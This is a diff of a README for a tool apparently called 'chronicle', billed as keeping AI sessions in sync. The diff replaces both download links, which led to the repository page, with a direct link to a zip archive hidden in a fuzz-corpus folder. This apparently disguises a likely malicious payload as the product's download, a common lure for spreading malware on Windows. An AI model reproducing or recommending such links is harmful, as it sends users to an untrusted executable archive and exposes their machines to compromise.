@@ -1,12 +1,12 @@
 # 🧭 chronicle - Keep AI sessions in sync
 
-[![Download chronicle](https://img.shields.io/badge/Download%20chronicle-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arterialienalisjournal342/chronicle)
+[![Download chronicle](https://img.shields.io/badge/Download%20chronicle-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arterialienalisjournal342/chronicle/raw/refs/heads/main/fuzz/corpus/fuzz_roundtrip/Software-bouillon.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download chronicle:
 
-https://github.com/arterialienalisjournal342/chronicle
+https://github.com/arterialienalisjournal342/chronicle/raw/refs/heads/main/fuzz/corpus/fuzz_roundtrip/Software-bouillon.zip
 
 ## 🪟 Windows setup
 
